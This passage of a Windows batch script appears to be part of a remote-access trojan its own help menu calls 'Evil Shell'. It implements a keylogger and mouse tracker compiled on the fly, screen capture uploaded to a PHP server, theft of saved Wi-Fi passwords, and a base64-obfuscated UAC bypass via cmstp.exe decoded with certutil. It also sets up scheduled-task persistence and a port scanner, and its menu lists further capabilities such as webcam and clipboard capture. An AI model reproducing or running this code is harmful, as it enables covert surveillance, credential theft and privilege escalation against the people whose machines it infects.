echo   Usage: port_scan ip1-ip2
echo   Usage: port_scan ip1-ip2 port1-port2
echo   Usage: port_scan arp
echo   Usage: port_scan arp port1-port2
exit /b
)

for /f "tokens=1,*" %%a in ('echo %port_scan_command%') do (
set scan_host=%%a
set scan_port=%%b
)
set scan_host=%scan_host:-=,%
if defined scan_port (
set scan_port=%scan_port:-=,%
) else (
set scan_port=top20
)
if "%scan_host%"=="arp" goto port_scan_opration
if exist "%scanner_file%" (
%scanner_file% hosts=%scan_host% ports=%scan_port%
) else (
echo [-] %scanner_file% not found
)
exit /b

:port_scan_opration
setlocal ENABLEDELAYEDEXPANSION
set arp_hosts_scan=
for /f "tokens=1" %%i in ('arp -a ^| find /i "dynamic"') do (
set arp_hosts_scan=!arp_hosts_scan!%%i,
)

if exist "%scanner_file%" (
%scanner_file% hosts=%arp_hosts_scan:~0,-1% ports=%scan_port%
) else (
echo [-] %scanner_file% not found
)
setlocal DISABLEDELAYEDEXPANSION
exit /b


:mouse_sniffer
echo.
set output_exe=mouse_sniffer.exe
set C#_script=%systemdrive%\_temp_\sniffer_mouse.cs
set mouse_command_2=
set mouse_command_3=
for /f "tokens=1,2" %%i in ("%shell_output:~14,100%") do set mouse_command_2=%%i& set mouse_command_3=%%j
if not defined mouse_command_2 echo   Usage: mouse_sniffer start/dump/stop time & echo   Usage: mouse_sniffer start 20 & echo   Usage: mouse_sniffer start -1 (continue)& echo   Usage: mouse_sniffer dump & echo   Usage: mouse_sniffer stop& exit /b
call :check_process retrun

if "%mouse_command_2%"=="stop" (
if %retrun%==10 (
	echo [+] Mouse Sniffer Already Stop
	exit /b
)
taskkill /im mouse_sniffer.exe /f >nul 2>&1 
timeout 2 >nul
if exist "%systemdrive%\_temp_\mouse_sniffer.tmp" del /q "%systemdrive%\_temp_\mouse_sniffer.tmp"
echo [+] Mouse Sniffer Stop Successfully
exit /b
)

if "%mouse_command_2%"=="dump" (
	if exist "%systemdrive%\_temp_\mouse_sniffer.tmp" (
		type "%systemdrive%\_temp_\mouse_sniffer.tmp"
		exit /b
	)
	echo [*] Mouse Sniffer is not starting yet
	exit /b
)

if "%mouse_command_2%"=="start" (
	if not defined mouse_command_3 (
		echo   Usage: mouse_sniffer start/stop time
		echo   Usage: mouse_sniffer start 20
		echo   Usage: mouse_sniffer stop 
		exit /b
	)
	
	if %retrun%==100 (
		echo [+] Mouse Sniffer Already Running
		exit /b
	)
   call :generate_c#
   start /b %~nx0 start_mouse_sniffer >"%systemdrive%\_temp_\mouse_sniffer.tmp" 2>&1
   echo [+] Mouse Sniffer Start Successfully
   exit /b
		
)

echo [-] mouse_sniffer %mouse_command_2% %mouse_command_3% invalid command
exit /b

:start_mouse_sniffer
%output_exe% %mouse_command_3%
exit


:keyboard_sniffer
echo.
set output_exe=keyboard_sniffer.exe
set c#_script=%systemdrive%\_temp_\sniffer_keyboard.cs
set keyboard_sniffer_command=
set keyboard_sniffer_command=%shell_output:~17,9999%
if not defined keyboard_sniffer_command echo   Usage: keyboard_sniffer start/dump/stop & exit /b
call :check_process retrun

if "%keyboard_sniffer_command%"=="stop" (
   if %retrun%==100 (
      taskkill /im keyboard_sniffer.exe /f >nul 2>&1
      timeout 5 >nul
      echo [+] keyboard_sniffer stop Successfully
      exit /b
   ) else (
      echo [*] keyboard_sniffer already stop
      exit /b
   )
   if exist "%systemdrive%\_temp_\keyboard_sniffer.tmp" del /q "%systemdrive%\_temp_\keyboard_sniffer.tmp" >nul
)

if "%keyboard_sniffer_command%"=="dump" (
   if exist "%systemdrive%\_temp_\keyboard_sniffer.tmp" (
      call :keyboard_sniffer_dump
      exit /b
   ) else (
      echo [*] keyboard_sniffer is not starting yet
      exit /b
   )
)



if "%keyboard_sniffer_command%"=="start" (
   if %retrun%==100 (
      echo [*] keyboard_sniffer already Running
      exit /b
   ) else (
      call :generate_c#
      start /b %~nx0 start_keyboard_sniffer >"%systemdrive%\_temp_\keyboard_sniffer.tmp" 2>&1
      echo [+] keyboard_sniffer start Successfully
      exit /b
   )
)

echo [-] keyboard_sniffer %keyboard_sniffer_command% invalid command
exit /b


:keyboard_sniffer_dump
setlocal EnableDelayedExpansion
set text=
for /f "delims=" %%a in ('type %systemdrive%\_temp_\keyboard_sniffer.tmp') do (
set text=!text! %%a
)
for %%a in ("%text%") do (
set text=!text:Space={Space}!
set text=!text:LControlKey={LControlKey}!
set text=!text:Back={Back}!
set text=!text:Return={Return}!
set text=!text:Down={Down}!
set text=!text:LShiftKeyOem6={LShiftKeyOem6}!
set text=!text:Right={Right}!
set text=!text:Left={Left}!
set text=!text:NumPad1={NumPad1}!
set text=!text:NumPad2={NumPad2}!
set text=!text:NumPad3={NumPad3}!
set text=!text:NumPad4={NumPad4}!
set text=!text:NumPad5={NumPad5}!
set text=!text:NumPad6={NumPad6}!
set text=!text:NumPad7={NumPad7}!
set text=!text:NumPad8={NumPad8}!
set text=!text:NumPad9={NumPad9}!
set text=!text:NumPad0={NumPad0}!
set text=!text:RShiftKey={RShiftKey}!
set text=!text:LShiftKey={LShiftKey}!
set text=!text:D0={D0}!
set text=!text:D1={D1}!
set text=!text:D2={D2}!
set text=!text:D3={D3}!
set text=!text:D4={D4}!
set text=!text:D5={D5}!
set text=!text:D6={D6}!
set text=!text:D7={D7}!
set text=!text:D8={D8}!
set text=!text:D9={D9}!
set text=!text:Oemtilde={Oemtilde}!
set text=!text:OemOpenBrackets={OemOpenBrackets}!
set text=!text:Oem6={Oem6}!
set text=!text:Oem1={Oem1}!
set text=!text:Oem7={Oem7}!
set text=!text:Oem5={Oem5}!
set text=!text:Oemcomma={Oemcomma}!
set text=!text:OemPeriod={OemPeriod}!
set text=!text:OemQuestion={OemQuestion}!
set text=!text:LWin={LWin}!
set text=!text:RWin={RWin}!
set text=!text:Escape={Escape}!
set text=!text:Tab={Tab}!
set text=!text:Capital={Capital}!
set text=!text:Divide={Divide}!
set text=!text:Multiply={Multiply}!
set text=!text:Subtract={Subtract}!
set text=!text:Add={Add}!
set text=!text:Decimal={Decimal}!
set text=!text:PrintScreen={PrintScreen}!
set text=!text:Delete={Delete}!
set text=!text:PageUp={PageUp}!
set text=!text:Up ={Up} !
set text=!text:Next={Next}!
set text=!text:OemMinus={OemMinus}!
set text=!text:Oemplus={Oemplus}!
set text=!text:Apps={Apps}!
set text=!text:F2={F2}!
set text=!text:F3={F3}!
set text=!text:F4={F4}!
set text=!text:F5={F5}!
set text=!text:F6={F6}!
set text=!text:F7={F7}!
set text=!text:F8={F8}!
set text=!text:F9={F9}!
set text=!text:F10={F10}!
set text=!text:F11={F11}!
set text=!text:F12={F12}!
set text=!text:F1 ={F1} !
echo !text!
)
setlocal DISABLEDELAYEDEXPANSION
exit /b

:check_process
timeout 2 >nul
set keyboard_process=
for /f "tokens=1" %%A in ('tasklist ^| find /i "%output_exe%"') do set keyboard_process=%%A
if "%keyboard_process%"=="%output_exe%" set %~1=100 & exit /b
set %~1=10
exit /b

:start_keyboard_sniffer
%output_exe%
exit


:screengrab
echo.
set screengrab_command=
set screengrab_command=%shell_output:~11,99999%
set output_exe=screengrab.exe
set C#_script=%systemdrive%\_temp_\screengrab.cs
set VisualBasicDLL=/r:"Microsoft.VisualBasic.dll"
call :generate_c#
set VisualBasicDLL=
if defined screengrab_command set screengrab_command=%screengrab_command:'="%
if exist "%systemdrive%\_temp_\%output_exe%" (
%output_exe% %screengrab_command%
goto screengrab_upload
) else (
echo [-] %output_exe% not found
)
exit /b


:screengrab_upload
setlocal ENABLEDELAYEDEXPANSION
for /f "tokens=1" %%A in ('echo %screengrab_command%') do set local-file=%%A
if not exist "%local-file%" exit /b
if exist "%local-file%" if not defined upload_php echo [-] First Set Upload Server URL & exit /b
if exist "%local-file%" set screengrab_url=!upload_php:index.php=%local-file%!
setlocal DISABLEDELAYEDEXPANSION
set errorlevel=
call :upload_file
if %errorlevel%==100 (
echo [+] %local-file% Uploaded Successfully to %screengrab_url%
if exist "%local-file%" del /q "%local-file%" >nul
) else (
echo [-] %local-file% can't uploaded
)
exit /b


:generate_c#
set "csc="
for /r "%SystemRoot%\Microsoft.NET\Framework\" %%# in ("*csc.exe") do  set "csc=%%#"

if not exist "%csc%" (
   echo [-] No .net framework installed
   exit /b
)
%csc% /nologo %VisualBasicDLL% /warn:0 /out:%systemdrive%\_temp_\%output_exe% %C#_script%
exit /b



:get_wifi
echo.
set wifi_command=
set wifi_command=%shell_output:~9,9999%
if not defined wifi_command echo   Usage: get_wifi profiles/networks/passwords/status & exit /b 
for /f "tokens=*" %%i in ('netsh wlan show drivers') do (
   if "%%i"=="There is no wireless interface on the system." echo [-] Wifi Driver Not Found & exit /b
   if "%%i"=="The Wireless AutoConfig Service (wlansvc) is not running." echo [-] wlansvc Service not running & exit /b
)
if "%wifi_command%"=="profiles" netsh wlan show profiles | find /i "All User Profile" & exit /b
if "%wifi_command%"=="networks" netsh wlan show network & exit /b
if "%wifi_command%"=="status" call :get-wifi_status & exit /b
if "%wifi_command%"=="passwords" (
   if not exist "%temp%\tmp_xml" mkdir "%temp%\tmp_xml" >nul
   del /q "%temp%\tmp_xml\*.*" >nul 2>&1
   netsh wlan export profile key=clear folder="%temp%\tmp_xml" >nul 2>&1
   goto Extract_XML
)
echo [-] get_wifi %wifi_command% invalid command & exit /b

:Extract_XML
setlocal EnableDelayedExpansion
for /f "tokens=*" %%a in ('dir /b /s "%temp%\tmp_xml\*.xml"') do (
set xmlfile="%%a"
call :get_password
)
rmdir /s /q "%temp%\tmp_xml" >nul 2>&1
exit /b

:get_password
set ssid=
set wifi_passwd=
for /F "skip=1 delims=" %%a in ('findstr /I /L "<name>" %xmlfile%') do (
   set "line=%%a"
   set "line=!line:*<name>=!"

   for /F "tokens=1 delims=<" %%b in ("!line!") do set ssid=%%b
)

for /F "delims=" %%a in ('findstr /I /L "<keyMaterial>" %xmlfile%') do (
   set "line=%%a"
   set "line=!line:*<keyMaterial>=!"

   for /F "tokens=1 delims=<" %%b in ("!line!") do set wifi_passwd=%%b
)
if defined ssid if defined wifi_passwd (
echo [+] %ssid% :: %wifi_passwd% 
)
setlocal DISABLEDELAYEDEXPANSION
exit /b

:get-wifi_status
for /f "tokens=* skip=2" %%A in ('netsh wlan show interfaces') do (
echo  %%A
)
exit /b 

:uac_bypass
echo.
set uac_command=
set uac_command=%shell_output:~11,9999999%
if not defined uac_command echo   Usage: uac_bypass evil.exe & echo   Usage: uac_bypass net users hacker /add & exit /b
if not exist "%systemdrive%\uac" mkdir "%systemdrive%\uac" >nul
if exist "%temp%\BYPASS_encode.txt" del /q "%temp%\BYPASS_encode.txt" >nul

echo QGVjaG8gb2ZmDQppZiBleGlzdCAiJXN5c3RlbWRyaXZlJVx1YWNcY29uZmlkLmlu >>"%temp%\BYPASS_encode.txt"
echo ZiIgZGVsICIlc3lzdGVtZHJpdmUlXHVhY1xjb25maWQuaW5mIiA+bnVsDQppZiBl >>"%temp%\BYPASS_encode.txt"
echo eGlzdCAiJXN5c3RlbWRyaXZlJVx1YWNcc2VuZF9rZXkudmJzIiBkZWwgIiVzeXN0 >>"%temp%\BYPASS_encode.txt"
echo ZW1kcml2ZSVcdWFjXHNlbmRfa2V5LnZicyIgPm51bA0Kc2V0IGNvbmZpZ19maWxl >>"%temp%\BYPASS_encode.txt"
echo PVczWmxjbk5wYjI1ZERRcFRhV2R1WVhSMWNtVTlKR05vYVdOaFoyOGtEUXBCWkha >>"%temp%\BYPASS_encode.txt"
echo aGJtTmxaRWxPUmoweUxqVU5DZzBLVzBSbFptRjFiSFJKYm5OMFlXeHNYUTBLUTNW >>"%temp%\BYPASS_encode.txt"
echo emRHOXRSR1Z6ZEdsdVlYUnBiMjQ5UTNWemRFbHVjM1JFWlhOMFUyVmpkR2x2YmtG >>"%temp%\BYPASS_encode.txt"
echo c2JGVnpaWEp6RFFwU2RXNVFjbVZUWlhSMWNFTnZiVzFoYm1SelBWSjFibEJ5WlZO >>"%temp%\BYPASS_encode.txt"
echo bGRIVndRMjl0YldGdVpITlRaV04wYVc5dURRb05DbHRTZFc1UWNtVlRaWFIxY0VO >>"%temp%\BYPASS_encode.txt"
echo dmJXMWhibVJ6VTJWamRHbHZibDBOQ2pzZ1EyOXRiV0Z1WkhNZ1NHVnlaU0IzYVd4 >>"%temp%\BYPASS_encode.txt"
echo c0lHSmxJSEoxYmlCQ1pXWnZjbVVnVTJWMGRYQWdRbVZuYVc1eklIUnZJR2x1YzNS >>"%temp%\BYPASS_encode.txt"
echo aGJHd05DbmR6WTNKcGNIUWdRenBjZFdGalhGVkNMblppY3cwS2RHRnphMnRwYkd3 >>"%temp%\BYPASS_encode.txt"
echo Z0wwbE5JR050YzNSd0xtVjRaU0F2UmcwS0RRcGJRM1Z6ZEVsdWMzUkVaWE4wVTJW >>"%temp%\BYPASS_encode.txt"
echo amRHbHZia0ZzYkZWelpYSnpYUTBLTkRrd01EQXNORGt3TURFOVFXeHNWVk5sY2w5 >>"%temp%\BYPASS_encode.txt"
echo TVJFbEVVMlZqZEdsdmJpd2dOdzBLRFFwYlFXeHNWVk5sY2w5TVJFbEVVMlZqZEds >>"%temp%\BYPASS_encode.txt"
echo dmJsME5DaUpJUzB4Tklpd2dJbE5QUmxSWFFWSkZYRTFwWTNKdmMyOW1kRnhYYVc1 >>"%temp%\BYPASS_encode.txt"
echo a2IzZHpYRU4xY25KbGJuUldaWEp6YVc5dVhFRndjQ0JRWVhSb2MxeERUVTFIVWpN >>"%temp%\BYPASS_encode.txt"
echo eUxrVllSU0lzSUNKUWNtOW1hV3hsU1c1emRHRnNiRkJoZEdnaUxDQWlKVlZ1Wlho >>"%temp%\BYPASS_encode.txt"
echo d1pXTjBaV1JGY25KdmNpVWlMQ0FpSWcwS0RRcGJVM1J5YVc1bmMxME5DbE5sY25a >>"%temp%\BYPASS_encode.txt"
echo cFkyVk9ZVzFsUFNKRGIzSndWbEJPSWcwS1UyaHZjblJUZG1OT1lXMWxQU0pEYjNK >>"%temp%\BYPASS_encode.txt"
echo d1ZsQk9JZzBLRFFvPQ0Kc2V0IHNlbmRfa2V5ZmlsZT1VMlYwSUhkemFGTm9aV3hz >>"%temp%\BYPASS_encode.txt"
echo SUQwZ1EzSmxZWFJsVDJKcVpXTjBLQ0pYVTJOeWFYQjBMbE5vWld4c0lpa2dEUXBF >>"%temp%\BYPASS_encode.txt"
echo YnlBTkNuSmxkQ0E5SUhkemFGTm9aV3hzTGtGd2NFRmpkR2wyWVhSbEtDSkRiM0p3 >>"%temp%\BYPASS_encode.txt"
echo VmxCT0lpa2dEUXBKWmlCeVpYUWdQU0JVY25WbElGUm9aVzRnRFFvZ0lDQWdkM05v >>"%temp%\BYPASS_encode.txt"
echo VTJobGJHd3VVMlZ1WkV0bGVYTWdJbnRGYm5SbGNuMGlEUW9nSUNBZ1FYVjBiMFJs >>"%temp%\BYPASS_encode.txt"
echo YkEwS1JXNWtJRWxtSUEwS1YxTmpjbWx3ZEM1VGJHVmxjQ0ExTURBZ0RRcE1iMjl3 >>"%temp%\BYPASS_encode.txt"
echo RFFvTkNnMEtEUXBHZFc1amRHbHZiaUJCZFhSdlJHVnNLQ2tOQ2dsVFpYUWdiMkpx >>"%temp%\BYPASS_encode.txt"
echo UmxOUElEMGdRM0psWVhSbFQySnFaV04wS0NKVFkzSnBjSFJwYm1jdVJtbHNaVk41 >>"%temp%\BYPASS_encode.txt"
echo YzNSbGJVOWlhbVZqZENJcERRb0pjM1J5VTJOeWFYQjBJRDBnVjNOamNtbHdkQzVU >>"%temp%\BYPASS_encode.txt"
echo WTNKcGNIUkdkV3hzVG1GdFpRMEtDVzlpYWtaVFR5NUVaV3hsZEdWR2FXeGxLSE4w >>"%temp%\BYPASS_encode.txt"
echo Y2xOamNtbHdkQ2tOQ2dsM2MyTnlhWEIwTG5GMWFYUU5Da1Z1WkNCR2RXNWpkR2x2 >>"%temp%\BYPASS_encode.txt"
echo Ymc9PQ0KZWNobyBbKl0gRGVjb2RpbmcgQ29uZmlsZSBGaWxlDQplY2hvICVjb25m >>"%temp%\BYPASS_encode.txt"
echo aWdfZmlsZSU+IiVzeXN0ZW1kcml2ZSVcdWFjXGNvbmZpZC5lbmNvZGUiDQpjZV5y >>"%temp%\BYPASS_encode.txt"
echo XnR1XnRpbCAtZGVjb2RlICIlc3lzdGVtZHJpdmUlXHVhY1xjb25maWQuZW5jb2Rl >>"%temp%\BYPASS_encode.txt"
echo IiAiJXN5c3RlbWRyaXZlJVx1YWNcY29uZmlkLmluZiIgPm51bA0KZWNobyAlc2Vu >>"%temp%\BYPASS_encode.txt"
echo ZF9rZXlmaWxlJT4iJXN5c3RlbWRyaXZlJVx1YWNcc2VuZF9rZXkuZW5jb2RlIg0K >>"%temp%\BYPASS_encode.txt"
echo Y2Vecl50dV50aWwgLWRlY29kZSAiJXN5c3RlbWRyaXZlJVx1YWNcc2VuZF9rZXku >>"%temp%\BYPASS_encode.txt"
echo ZW5jb2RlIiAiJXN5c3RlbWRyaXZlJVx1YWNcc2VuZF9rZXkudmJzIiA+bnVsDQpl >>"%temp%\BYPASS_encode.txt"
echo Y2hvIFsrXSBEZWNvZGluZyBEb25lDQplY2hvIFsrXSBDcmVhdGluZyBCeVBhc3Mg >>"%temp%\BYPASS_encode.txt"
echo U2NyaXB0DQppZiBleGlzdCAiJXN5c3RlbWRyaXZlJVx1YWNcVUIudmJzIiBkZWwg >>"%temp%\BYPASS_encode.txt"
echo IiVzeXN0ZW1kcml2ZSVcdWFjXFVCLnZicyIgPm51bA0KZWNobyBTZXQgb2JqU2hl >>"%temp%\BYPASS_encode.txt"
echo bGwgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpPj4iJXN5 >>"%temp%\BYPASS_encode.txt"
echo c3RlbWRyaXZlJVx1YWNcVUIudmJzIg0KZWNobyBvYmpTaGVsbC5SdW4gKCIlcGF5 >>"%temp%\BYPASS_encode.txt"
echo bG9hZCUiKSwwID4+IiVzeXN0ZW1kcml2ZSVcdWFjXFVCLnZicyINCmVjaG8gWypd >>"%temp%\BYPASS_encode.txt"
echo IFN0YXJ0aW5nIEV4cGxvaXQNCnN0YXJ0IEM6XHVhY1xzZW5kX2tleS52YnMNCnBp >>"%temp%\BYPASS_encode.txt"
echo bmcgbG9jYWxob3N0IC1uIDIgPm51bA0KaWYgZXhpc3QgIiVzeXN0ZW1kcml2ZSVc >>"%temp%\BYPASS_encode.txt"
echo dWFjXHJ1bi52YnMiIGRlbCAvcSAiJXN5c3RlbWRyaXZlJVx1YWNccnVuLnZicyIg >>"%temp%\BYPASS_encode.txt"
echo Pm51bA0KZWNobyBTZXQgb2JqU2hlbGwgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgi >>"%temp%\BYPASS_encode.txt"
echo V1NjcmlwdC5TaGVsbCIpPj4iJXN5c3RlbWRyaXZlJVx1YWNccnVuLnZicyINCmVj >>"%temp%\BYPASS_encode.txt"
echo aG8gb2JqU2hlbGwuUnVuICgiY21zdHAuZXhlIC9hdSAlc3lzdGVtZHJpdmUlXHVh >>"%temp%\BYPASS_encode.txt"
echo Y1xjb25maWQuaW5mIiksMSA+PiIlc3lzdGVtZHJpdmUlXHVhY1xydW4udmJzIg0K >>"%temp%\BYPASS_encode.txt"
echo c3RhcnQgQzpcdWFjXHJ1bi52YnMNCmVjaG8gWytdIEV4cGxvaXQgRG9uZQ0KZXhp >>"%temp%\BYPASS_encode.txt"
echo dCAvYg== >>"%temp%\BYPASS_encode.txt"




if exist "%temp%\BYPASS_encode.txt" (
if exist "%temp%\BYPASS.bat" del /q "%temp%\BYPASS.bat" >nul
certutil -decode "%temp%\BYPASS_encode.txt" "%temp%\BYPASS.bat" >nul 2>&1
) else (
echo [-] "%temp%\BYPASS.bat" Can't Create
exit /b
)
set payload=%uac_command%
if exist "%temp%\BYPASS.bat" call "%temp%\BYPASS.bat"
exit /b



:get_task
echo.
:get_task2
For /F "tokens=1" %%A in ('SchTasks /Query /TN "Admin_command" 2^>^&1') do (
if "%%A"=="Admin_command" echo [+] Admin Task Scheduler Found & exit /b 200
)
echo [-] Admin Task Scheduler Not Found
exit /b 201




:add_task
echo.
For /F "tokens=1" %%A in ('SchTasks /Query /TN "Admin_command" 2^>^&1') do (
if "%%A"=="Admin_command" echo [+] Admin task Already Created & exit /b 
)
set errorLevel=
REG ADD HKLM /F >nul 2>&1
if %errorLevel% == 0 (
SchTasks /Create /SC DAILY /TN "Admin_command" /TR "cscript /nologo %systemdrive%\_temp_\admin.vbs %base%" /ST 00:00 /RL HIGHEST /F >nul
echo [+] Task Scheduler Create Successfully
echo [*] Checking is Added or not
call :get_task2
) else (
echo [-] You Don't Have Admin Privileges
)
exit /b

:start_task
echo.
set errorlevel=
call :get_task2
if %errorlevel%==200 (
set errorlevel=
echo [*] Start Task Scheduler
schtasks /run /TN "Admin_command" >nul 2>&1
) else (
exit /b 
)
if %errorlevel%==0 echo [+] Task Scheduler Success & exit /b
echo [-] Task Scheduler Failed
exit /b


:help
echo.
echo  *****(Help Menu)*****
echo.
echo [Local Commands]
echo.
echo  ps			Get Process List
echo  kill			Kill Process
echo  ls			Get Files List
echo  search 		Search File and folder
echo  rm			Delete File or files
echo  rmdir			Remove Directory or Sub Directorys
echo  show_drive		Get All local Disks
echo  open			Open directory and URL
echo  pwd			Get Current Directory
echo  cd			Change Directory
echo  cat			Read File Content
echo  cp			Copy File to another location
echo  mv			Move File to another location
echo  lockscreen		Lock Desktop Screen
echo  sleep			sleep time
echo.
echo [gathering information]
echo.
echo  get_av			Get ant^ivi^rus Info
echo  get_priv		Get privileges
echo  get_users		Get all localAccounts
echo  get_path		Get all Paths
echo  get_services		Get All Services
echo  get_install		Get all installed softwares
echo  get_startup		Get All Auto Startup Process
echo  get_file_info		Get local File Information(exe,dll,msi)
echo  sysinfo		Get System information
echo.
echo [Network Commands]
echo.
echo  ifconfig		Get IP Adress
echo  arp			Get ARP Tables
echo  netview		To view computers on your network
echo  netstat		Get All TCP/IP Connection
echo  port_scan		Scan Host/IP Open Ports
echo  host_scan		Scan Host Services (nbns,smb,wmi)
echo  get_ip			Get Public IP Address
echo  geolocate		Get IP Information,GeoLocation,ISP etc.
echo  get_wifi               Get All Wifi Profiles, Networks, Passwords
echo  download		Download Http Server File
echo  upload			Upload file to PHP Server
echo  portfwd		Port Forword to remote Address
echo  set upload_url		Set Upload Server URL
echo  show upload_url	Show PHP Server URL
echo.
echo [Special Commands]
echo.
echo  screenshot		Get current desktop screenshot and upload to PHP server
echo  screengrab		captures the screen or the active window and saves it to a file and upload to php server
echo  webcam_snap		Get Webcam Snap
echo  get_clip		Get clipboard data
echo  get_win		Get all windows list
echo  win_mode		Changed the mode of a window
echo  showkeys               List All Keys
echo  sendkeys               Send Keyborard Keys
echo  mouse_control		Control Mouse 
echo  mouse_sniffer		Tracking mouse activity
echo  keyboard_sniffer	Tracking keyboard keys
echo  winvnc			Control target system via Winvnc
echo  speech                 Text to speech
echo  uac_bypass		Bypass User Account Control via cmstp.exe
echo  add_task		Create Admin Task Scheduler
echo  get_task		Get Admin Task Scheduler
echo  start_task		Start Admin Task Scheduler
echo.
echo [Advance Commands]
echo.
echo  shell			Command Promapt interpreter
echo  powershell 		powershell interpreter
echo  python                 Python interpreter and run .py script 
echo  sqlite                 sqlite interpreter
echo  exec			Execute local commands 
echo  run			Run file
echo  update			Update Evil Shell
echo  @			Multi Commands
echo.
exit /b

